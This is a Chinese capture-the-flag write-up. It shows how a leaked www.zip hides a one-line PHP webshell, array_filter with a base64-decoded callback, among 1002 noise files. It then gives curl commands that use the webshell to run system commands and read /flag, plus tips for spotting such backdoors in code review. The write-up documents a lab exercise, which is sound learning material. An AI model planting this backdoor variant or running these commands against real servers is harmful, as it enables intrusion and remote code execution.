# WP · qsnctf 40841「源码泄露 + 后门一句话木马 RCE」

> 平台：qsnctf（nssctf 镜像）｜ 题型：源码泄露 → 代码审计 → RCE（命令执行）
> 入口：http://challenge.qsnctf.com:40841/
> flag：`flag{c468b0f92441432f970aff939afde53f}`

---

## 0. 一句话思路

首页给了个 `www.zip` 下载 → 解压后是 1002 个随机哈希命名的 PHP 文件（几乎全是噪声）→ 在其中 1 个文件末尾藏着一句**一句话木马** → 用 base64 编码的回调函数名 + POST 传参实现 **RCE** → `cat /flag` 拿到 flag。

---

## 1. 信息收集

首页只有一句话 + 一个下载按钮：

```html
<p>Click the button below to download the <strong>www.zip</strong> file.</p>
<a href="/www.zip" download>Download www.zip</a>
```

这是典型的**源码/备份泄露**套路：把网站源码打包成 `www.zip` 放在根目录，谁都能下。

```bash
curl -s -o www.zip "http://challenge.qsnctf.com:40841/www.zip"
unzip -o www.zip -d www_extract
```

解压出 **1002 个**文件名形如 `002893c1e82a4e6fa89c96ae57cfe9c2.php` 的 PHP 文件，内容全是随机噪声（json 编解码、正则匹配、rand、date、阶乘函数等），不含明文字符串 "flag"。

---

## 2. 代码审计：在噪声里找针

1002 个文件里 1001 个内容各不相同（都是噪声），但有一个文件末尾多了一行**后门**：

文件 `1de9d9a55a824f4f8b6f37af76596baa.php` 末尾：

```php
<?php
// ... 上面全是噪声代码 ...
$e=$_REQUEST['e'];
$arr=array($_POST['POST'],);
array_filter($arr,base64_decode($e));
?>
```

### 这行在干什么？

- `$e = $_REQUEST['e']` → 从请求里取 `e` 参数（GET/POST 都行）
- `base64_decode($e)` → 把 `e` 的值当 base64 解码，得到一个**函数名字符串**，比如 `system`
- `$arr = array($_POST['POST'])` → 数组里只有一个元素，就是 POST 提交的 `POST` 字段内容
- `array_filter($arr, "system")` → `array_filter` 会把数组每个值传给第二个参数（回调函数）执行
  → 等价于 `system($_POST['POST'])`

**结论：`e=base64("system")`、`POST=任意系统命令` → 命令执行（RCE）。**

> 小贴士：`array_filter(数组, 回调函数)` 是 PHP 里常被用来做"隐式回调执行"的 trick。把回调函数名用 base64 藏起来，能让源码审计的人一眼扫过去不容易发现（base64 串看起来像乱码）。

---

## 3. 构造利用

`system` 的 base64 = `c3lzdGVt`（可自己算：`echo -n system | base64`）。

关键点（新手易踩坑）：
- `e` 走 URL 查询串（`?e=c3lzdGVt`），因为 `$_REQUEST` 能读到 GET；
- `POST` 必须真正放在 **POST body**，用 `-d "POST=命令"`，不能用 `-G` 把它也塞进 URL（否则 `$_POST['POST']` 为空，报 "Cannot execute a blank command"）。

```bash
# 探测环境 + 找 flag 位置
curl -s "http://challenge.qsnctf.com:40841/1de9d9a55a824f4f8b6f37af76596baa.php?e=c3lzdGVt" \
  -d "POST=id; ls -la /; find / -iname 'flag*' 2>/dev/null"

# 读 flag
curl -s "http://challenge.qsnctf.com:40841/1de9d9a55a824f4f8b6f37af76596baa.php?e=c3lzdGVt" \
  -d "POST=cat /flag"
```

返回：

```
uid=82(www-data) gid=82(www-data) ...
/flag
flag{c468b0f92441432f970aff939afde53f}
```

---

## 4. 踩坑记录

1. **`-G` 把 POST 参数也变 GET**：一开始用 `curl -G --data-urlencode "POST=..."`，结果 `POST` 被拼进 URL，`$_POST['POST']` 为空 → 报 "Cannot execute a blank command"。改成 `?e=...` + `-d "POST=..."` 解决。
2. **实例瞬断**：中途一次请求返回 HTTP 000（连接失败），以为实例被重置、文件没了；重试后恢复正常，flag 值不变。这类随机文件题环境偶尔会瞬断，重试即可，不必重开。

---

## 5. 知识点小结

| 点 | 说明 |
|---|---|
| 源码/备份泄露 | `www.zip`、`www.rar`、`backup.zip`、`*.bak`、`.git/` 等常直接挂根目录，先扫一波 |
| 噪声混淆 | 大量随机文件里藏 1 个后门，用 `grep` 搜特征（如 `base64_decode`、`array_filter`、`$_REQUEST`）快速定位 |
| 一句话木马变体 | `array_filter($arr, base64_decode($e))` 比 `$_GET['x'](..)` 更隐蔽 |
| RCE 利用 | `e=base64(回调函数名)`、`POST=命令`，注意 GET/POST 区分 |

> 同款思路可迁移：搜 `base64_decode`、`create_function`、`assert`、`preg_replace /e`、`$_REQUEST` 组合。
